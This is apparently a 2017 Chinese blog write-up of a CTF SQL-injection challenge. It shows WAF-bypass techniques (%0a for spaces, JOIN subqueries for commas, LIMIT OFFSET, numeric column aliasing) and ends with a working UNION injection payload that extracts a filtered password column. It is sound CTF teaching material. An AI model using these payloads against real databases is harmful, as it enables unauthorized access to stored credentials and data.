---
title: SQLi —— 逗号，空格，字段名过滤突破
categories:
  - SQL注入
tags:
  - SQL注入绕过
toc: true 文章目录
author: BlBana
date: 2017-05-20 14:31:05
description:
comments:
original:
permalink:
---
### SQLi-——-逗号，空格，字段名过滤突破
在做CTF的时候，遇到了一道SQL注入的题目，发现空格，逗号都被过滤掉了，空格被过滤有很多种方法可以绕过，但是逗号被过滤掉，最后在参考了V师傅的blog以后把题做了出来

<!-- more -->

#### 0x01 测试
拿到题首先，先测试了一下：
当语句被filter过滤拦截时显示，`Error input`；
当语句成功进入数据库，但是构造语句出现语法错误时，返回`error`；
当语句成功注入时，回显对应的数据。

经过测试发现， 有一些字符无法正常的使用
`逗号，空格，单引号，斜杠等等`
只要检测到这些字符，就会拦截我们注入的语句，因此我们需要Bypass Waf

#### 0x02 Bypass the waf
1. 首先我们空格被过滤，这个绕过方法有很多
- 使用注释绕过，`/**/`，但是因为'/'被过滤，导致此方法无法使用
- 使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用`（）`包围，并且两端可以没有多余的空格
- 使用符号替代空格 `%20 %09 %0d %0b %0c %0d %a0 %0a`，这里我选择了`%0a`进行绕过

2. '，'也被过滤掉了，我们需要使用union的查询需要逗号
通过查阅资料，找到了一种可以绕过的方法

可以使用join来进行绕过，可以绕过逗号，使用联合查询
```sql
mysql> SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d;
+---+---+---+---+
| 1 | 2 | 3 | 4 |
+---+---+---+---+
| 1 | 2 | 3 | 4 |
+---+---+---+---+
```
在SELECT处也可以构造一些查询语句
```sql
mysql> SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT version())d;
+---+---+---+-----------+
| 1 | 2 | 3 | version() |
+---+---+---+-----------+
| 1 | 2 | 3 | 5.5.47    |
+---+---+---+-----------+
```
当我们这样注入的时候，可能查询结果只能显示一条结果的某一列
```sql
mysql> SELECT A.user_id from (SELECT user_id,last_name,first_name,user from users union select 1,2,3,4)A;
+---------+
| user_id |
+---------+
|       1 |
|       2 |
|       3 |
|       4 |
|       5 |
|       1 |
+---------+
```

```sql
mysql> SELECT A.user_id from (SELECT user_id,last_name,first_name,user from users union select 1,2,3,4)A;
+---------+
| user_id |
+---------+
|       1 |
|       2 |
|       3 |
|       4 |
|       5 |
|       1 |
+---------+
```
我们可以将查询结果集取一个别名，再通过字段名来进行来进行访问具体的某一个字段的值，这里将数字的查询放在前面，将具体数据的查询语句使用联合查询进行连接比较好，这样做的好处是，我们可以不用知道**具体的字段名**，而**使用数字来进行访问**，我们只要保证字段的数目相同就可以了，后面的联合查询语句的字段名选择使用`*`来查询所有的字段，**即便我们需要查询字段名被过滤，也可以绕过过滤注入出数据**

#### 0x03 exp编写
这道题主要一道UNION的联合注入题目，主要难点是字段名被过滤，注入语句中不能出现字段名，并且空格和逗号被过滤，共4个字段，语句构造如下：
```sql
-1 UNION ALL SELECT * FROM 1,2,3,4
```
逗号被过滤，Bypass：
```sql
-1 UNION ALL SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d)
```
查询出字段名为password，是第四个字段，但是password被过滤，Bypass：
*逗号被过滤，使用limit的时可以使用另外的一种写法*`LIMIT M OFFSET N`,来取某一条结果，再使用F.4，来取对应字段的值，可以绕过字段名的过滤，成功注入数据
```sql
-1 UNION ALL SELECT * FROM ((SELECT 1)a JOIN (SELECT F.4 from (SELECT * FROM (SELECT 1)u JOIN (SELECT 2)i JOIN (SELECT 3)o JOIN (SELECT 4)r UNION SELECT * FROM NEWS LIMIT 1 OFFSET 4)F)b JOIN (SELECT 3)c JOIN (SELECT 4)d)
```
最后，由于空格也被过滤，只需要将上面的exp中的空格全部替换成`%0a`就可以了

#### 0x04
使用这种方法，可以绕过逗号，空格，字段名都被过滤的情况，上面的payload也适用于很多种绕过waf的情景，可以灵活的运用

#### 参考链接
[About Join --- SQLi Veneno's Blog](http://www.venenof.com/index.php/archives/240/)
[ 基于union查询的盲注](http://wonderkun.cc/index.html/?cat=1&paged=3)



---
